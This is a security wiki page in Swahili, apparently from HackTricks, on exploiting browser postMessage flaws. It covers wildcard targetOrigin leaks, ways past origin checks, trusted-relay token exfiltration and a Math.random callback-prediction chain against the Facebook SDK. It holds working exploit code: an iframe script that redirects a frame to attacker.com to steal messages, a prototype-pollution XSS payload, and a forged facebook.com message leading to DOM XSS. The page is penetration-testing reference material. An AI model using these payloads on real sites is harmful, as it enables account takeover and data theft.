# Udhaifu za PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Tuma **PostMessage**

**PostMessage** hutumia function ifuatayo kutuma ujumbe:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Kumbuka kwamba **targetOrigin** inaweza kuwa '\*' au URL kama _https://company.com._\
Katika **senario ya pili**, **ujumbe unaweza kutumwa tu kwa domain hiyo** (hata kama origin ya Window object ni tofauti).\
Ikiwa **wildcard** inatumiwa, **jumbe zinaweza kutumwa kwa domain yoyote**, na zitatumwa kwa origin ya Window object.

### Kushambulia iframe & wildcard katika **targetOrigin**

Kama ilivyoelezewa katika [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ikiwa utapata ukurasa ambao unaweza **iframed** (hakuna `X-Frame-Header` protection) na unao **tuma jumbe nyeti** kupitia **postMessage** ukitumia **wildcard** (\*), unaweza **badilisha** **origin** ya **iframe** na **leak** **ujumbe nyeti** kwa domain inayodhibitiwa na wewe.\
Kumbuka kuwa ikiwa ukurasa unaweza iframed lakini **targetOrigin** imewekwa kwa URL na sio wildcard, ujanja huu hautafanya kazi.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** ni function inayotumika na JS kutangaza function ambayo inatarajia `postMessages`.\
Msimbo unaofanana na ufuatao utatumika:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note kwa kesi hii jinsi kitu cha **kwanza** ambacho code inafanya ni **kuangalia origin**. Hii ni sana **muhimu** hasa ikiwa ukurasa unataka kufanya **kitu chochote nyeti** na taarifa zilizopokelewa (kama kubadilisha password). **Ikiwa haitakagua origin, washambuliaji wanaweza kufanya wahanga watumie data ya aina yoyote kwa endpoints hizi** na kubadilisha password za wahanga (kifungu hiki ni mfano).

### Uorodheshaji

Ili **kugundua event listeners** kwenye ukurasa wa sasa unaweza:

- **Tafuta** code ya JS kwa `window.addEventListener` na `$(window).on` (_JQuery version_)
- **Tekeleza** kwenye developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Nenda kwa** _Elements --> Event Listeners_ kwenye developer tools za browser

![](<../../images/image (396).png>)

- Tumia **browser extension** kama [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) au [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Browser extensions hizi zita **kuingilia kati ujumbe wote** na kuonyesha kwako.

### Origin check bypasses

- **`event.isTrusted`** attribute inachukuliwa kuwa salama kwa kuwa inarudisha `True` tu kwa events zinazotengenezwa na vitendo halisi vya mtumiaji. Ingawa ni ngumu kuvuka ikiwa imetekelezwa kikamilifu, umuhimu wake katika ukaguzi wa usalama ni mkubwa.
- Matumizi ya **`indexOf()`** kwa uhalali wa origin katika PostMessage events yanaweza kuwa nyeti kwa bypass. Mfano unaoonyesha udhaifu huu ni:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Mbinu ya **`search()`** kutoka `String.prototype.search()` imekusudiwa kwa regular expressions, sio strings. Kupitisha chochote isipokuwa regexp husababisha uongozaji wa implicit kuwa regex, na kufanya method iwe isiyo salama. Hii ni kwa sababu katika regex, dot (.) hufanya kazi kama wildcard, ikiruhusu kuvuka uhalali kwa domain zilizo sanifiwa kwa ustadi. Kwa mfano:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Kazi ya **`match()`**, sawa na `search()`, inashughulikia regex. Ikiwa regex siyo imetengenezwa vizuri, inaweza kuwa rahisi kuvuka.
- Kazi ya **`escapeHtml`** imekusudiwa kusafisha inputs kwa ku-escape characters. Hata hivyo, haitaunda object mpya iliyokataliwa bali inaandika juu ya properties za object iliyopo. Tabia hii inaweza kutumiwa vibaya. Hasa, ikiwa object inaweza kudhibitiwa kiasi kwamba property yake inayodhibitiwa haishtaki `hasOwnProperty`, `escapeHtml` haitafanya kazi kama inavyotarajiwa. Hii inaonyeshwa kwenye mifano hapa chini:

- Kushindwa Kunayotarajiwa:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Kupitisha escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Katika muktadha wa udhaifu huu, object ya `File` inakuwa nyeti kwa matumizi vibaya kwa sababu property yake `name` ni read-only. Property hii, inapoitwa katika templates, haisafishwi na `escapeHtml`, na kusababisha hatari za usalama.

- Property ya `document.domain` katika JavaScript inaweza kuwekwa na script ili kufupisha domain, ikiruhusu utekelezaji mdogo zaidi wa same-origin policy ndani ya parent domain ile ile.

### Origin-only trust + trusted relays

Ikiwa receiver inachunguza tu **`event.origin`** (mfano, inamwamini yeyote `*.trusted.com`) mara nyingi unaweza kupata **ukurasa wa "relay" kwenye origin hiyo ambao unarudisha params zinazo kutawaliwa na mshambuliaji kupitia `postMessage`** kwa `targetOrigin`/`targetWindow` iliyotolewa. Mifano ni pamoja na gadgets za marketing/analytics ambazo zinachukua query params na zinaweka mbele `{msg_type, access_token, ...}` kwa `opener`/`parent`. Unaweza:

- **Fungua ukurasa wa mhanga katika popup/iframe ambalo lina `opener`** ili handlers zake ziweze kujisajili (piksela/SDK nyingi zinaweka listeners tu wakati `window.opener` ipo).
- **Elekeza dirisha lingine la mshambuliaji kwa relay endpoint kwenye trusted origin**, ukijaza fields za message unazotaka kuingizwa (message type, tokens, nonces).
- Kwa kuwa message sasa inatoka **chini ya trusted origin**, ukaguzi wa origin pekee hupita na unaweza kuchochea tabia za kifalme (mabadiliko ya state, API calls, DOM writes) katika listener ya mhanga.

Mifano ya matumizi mabaya iliyotazamwa:

- Analytics SDKs (mfano, pixel/fbevents-style) hupokea messages kama `FACEBOOK_IWL_BOOTSTRAP`, kisha **hufanya call kwa backend APIs ikitumia token iliyotolewa kwenye message** na kujumuisha **`location.href` / `document.referrer`** kwenye body ya request. Ukitoa token yako mwenyewe, unaweza **kusoma requests hizi katika history/logs za token** na ku-exfil **OAuth codes/tokens** zilizopo kwenye URL/referrer ya ukurasa wa mhanga.
- Relay yoyote inayorudisha fields za aina yoyote kupitia `postMessage` inakuwezesha **kupigia kelele aina za message** zinazotarajiwa na listeners zenye ruhusa. Changanya na validation dhaifu ya input kufikia Graph/REST calls, kufungua features, au flows zinazofanana na CSRF.

Vidokezo vya kuwinda: orodheshaji `postMessage` listeners ambazo zinachunguza tu `event.origin`, kisha tafuta **HTML/JS endpoints za same-origin zinazotuma URL params kupitia `postMessage`** (marketing previews, login popups, OAuth error pages). Unganisha zote kwa kutumia `window.open()` + `postMessage` ili kuvuka ukaguzi wa origin.

### e.origin == window.origin bypass

Unapoembed page ndani ya **sandboxed iframe** ukitumia %%%%%%, ni muhimu kuelewa kuwa origin ya iframe italekwa kuwa null. Hii ni muhimu hasa linapokuja suala la sandbox attributes na athari zake kwenye usalama na utendakazi.

Kwa kuashiria **`allow-popups`** katika sandbox attribute, popup yoyote inayofunguliwa kutoka ndani ya iframe itapata restrictions za sandbox za parent yake. Hii inamaanisha kwamba isipokuwa attribute ya **`allow-popups-to-escape-sandbox`** pia iungezwe, origin ya popup itakuwa pia `null`, ikilingana na origin ya iframe.

Kwa hivyo, wakati popup inafunguliwa chini ya masharti haya na message ikitumwa kutoka iframe kwenda popup kwa kutumia **`postMessage`**, pande zote za kutuma na kupokea zitakuwa na origin `null`. Hali hii inasababisha scenari ambapo **`e.origin == window.origin`** itahesabiwa kuwa true (`null == null`), kwa sababu iframe na popup zinashiriki thamani ya origin `null`.

Kwa maelezo zaidi **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Inawezekana kuchunguza kama message ilitoka kwenye window hiyo hiyo ambayo script inaysikiliza (hasa inavutia kwa **Content Scripts from browser extensions** kuchunguza kama message ilitumwa kutoka ukurasa ule ule):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Unaweza kulazimisha **`e.source`** ya ujumbe iwe null kwa kuunda **iframe** inayotuma **postMessage** na kufutwa mara moja.

Kwa maelezo zaidi **soma:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Ili kutekeleza mashambulizi haya, kwa kawaida utaweza **kuweka ukurasa wa tovuti wa mwathirika** ndani ya `iframe`. Lakini baadhi ya headers kama `X-Frame-Header` zinaweza **kuzuia** tabia hiyo.\
Katika hali hizo bado unaweza kutumia shambulio lisilo la siri. Unaweza kufungua tab mpya kwa vulnerable web application na kuwasiliana nayo:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kupora ujumbe uliotumwa kwa iframe ya mtoto kwa kuzuia ukurasa **mkuu**

Katika ukurasa ufuatao unaweza kuona jinsi unavyoweza kupora **data nyeti ya postmessage** iliyotumwa kwa **iframe ya mtoto** kwa **kuzuia** **mkuu** ukurasa kabla ya kutuma data na kutumia vibaya **XSS kwenye iframe ya mtoto** ili **leak the data** kabla haipokewi:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Kupora ujumbe kwa kubadilisha eneo la iframe

Iwapo unaweza ku-iframe ukurasa wa wavuti bila X-Frame-Header unaoeleza iframe nyingine ndani, unaweza **kubadilisha eneo la iframe ya mtoto**, hivyo ikiwa inapokea **postmessage** iliyotumwa kwa kutumia **wildcard**, mshambuliaji anaweza **kubadilisha** iframe hiyo **origin** kwenda kwa ukurasa **unaodhibitiwa** na yeye na **kupora** ujumbe:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Katika hali ambapo data iliyotumwa kupitia `postMessage` inatekelezwa na JS, unaweza **iframe** ukurasa na **exploit** **prototype pollution/XSS** kwa kutuma exploit kupitia `postMessage`.

Baadhi ya maelezo mazuri kuhusu **XSS kupitia `postMessage`** yanaonekana katika [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Mfano wa exploit ya kutumia **Prototype Pollution kisha XSS** kupitia `postMessage` kwa `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Kwa **maelezo zaidi**:

- Kiungo kwenye ukurasa kuhusu [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Kiungo kwenye ukurasa kuhusu [**XSS**](../xss-cross-site-scripting/index.html)
- Kiungo kwenye ukurasa kuhusu [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Kutabiri **`Math.random()`** callback tokens in postMessage bridges

When message validation uses a “siri ya pamoja” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** SDK huweka majina kwa iframes za plugin kwa kutumia `guid()`. Ikiwa una udhibiti wa top frame, iframe ukurasa wa mwathiriwa, kisha elekeza plugin iframe kwenye origin yako (mfano, `window.frames[0].frames[0].location='https://attacker.com'`) na soma `window.frames[0].frames[0].name` kupata raw `Math.random()` output.
- **Force more outputs without reloads:** Baadhi ya SDK zinaonyesha njia ya reinit; katika FB SDK, kuchoma `init:post` na `{xfbml:1}` inalazimisha `XFBML.parse()`, inaangamiza/kuunda tena plugin iframe, na inazalisha majina/mapaka ya callback mapya. Kurudia reinit kunatoa PRNG outputs kadiri inavyohitajika (kumbuka wito za ndani za ziada za `Math.random()` kwa callback/iframe IDs, hivyo solvers lazima wapite juu ya thamani za kati).
- **Trusted-origin delivery via parameter pollution:** Ikiwa endpoint ya plugin ya first-party inarudisha parameter isiyosafishwa ndani ya payload ya cross-window (mfano, `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), unaweza kuingiza `&type=...&iconSVG=...` huku ukihifadhi trusted `facebook.com` origin.
- **Predict the next callback:** Badilisha leaked iframe names kurudi kuwa floats katika `[0,1)` na ingiza thamani kadhaa (hata zisizo mfululizo) kwenye V8 `Math.random` predictor (mfano, Z3-based). Zalisha `guid()` inayofuata kwa mazingira yako ili kutengeneza expected callback token.
- **Trigger the sink:** Andaa data ya postMessage ili bridge itoe `xd.mpn.setupIconIframe` na injekti HTML ndani ya `iconSVG` (mfano, URL-encoded `<img src=x onerror=...>`), ukifikia DOM XSS ndani ya hosting origin; kutoka huko, same-origin iframes (OAuth dialogs, arbiters, nk.) zinaweza kusomwa.
- **Framing quirks help:** Mnyororo unahitaji framing. Katika baadhi ya mobile webviews, `X-Frame-Options` inaweza kushuka kuwa isiyoungwa mkono `ALLOW-FROM` wakati `frame-ancestors` ipo, na vigezo vya “compat” vinaweza kulazimisha `frame-ancestors` yenye kuruhusu, kuwezesha channel ya upande wa `window.name`.

#### Mfano mdogo wa ujumbe uliodanganywa
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Marejeo

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Kwa mazoezi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
